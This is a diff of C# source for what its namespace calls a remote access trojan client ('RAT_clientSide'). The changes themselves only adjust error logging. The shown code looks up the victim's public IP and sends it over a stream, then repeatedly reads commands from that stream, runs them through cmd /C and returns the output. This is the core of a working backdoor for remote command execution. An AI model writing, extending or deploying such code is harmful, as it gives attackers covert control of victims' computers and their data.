@@ -30,14 +30,12 @@ namespace RAT_clientSide
             {
                 //Get the ip and send it
                 string myIp = new WebClient().DownloadString(@"http://icanhazip.com").Trim();
-                logToFile(myIp);
                 sw.WriteLine(myIp);
                 sw.Flush();
             }
             catch (Exception e)
             {
-                //logToFile(Convert.ToString(e));
-                Console.WriteLine(e);
+                logToFile(Convert.ToString(e));
             }
 
             //Prepare cmd start object
@@ -58,7 +56,10 @@ namespace RAT_clientSide
                     Cmd = sr.ReadLine();
                     Console.WriteLine(Cmd);
                 }
-                catch (Exception e) { }
+                catch (Exception e)
+                {
+                    logToFile(Convert.ToString(e));
+                }
 
                 //Insert the arguement and run the cmd
                 cmdProcess.StartInfo.Arguments = "/C " + Cmd;
@@ -66,13 +67,18 @@ namespace RAT_clientSide
 
                 string output = cmdProcess.StandardOutput.ReadToEnd();
 
-                //Try to send the commands
+                Console.WriteLine(output);
+
+                //Try to send the output
                 try
                 {
                     sw.WriteLine(output);
                     sw.Flush();
                 }
-                catch (Exception e) { }
+                catch (Exception e)
+                {
+                    logToFile(Convert.ToString(e));
+                }
             }
         }
 
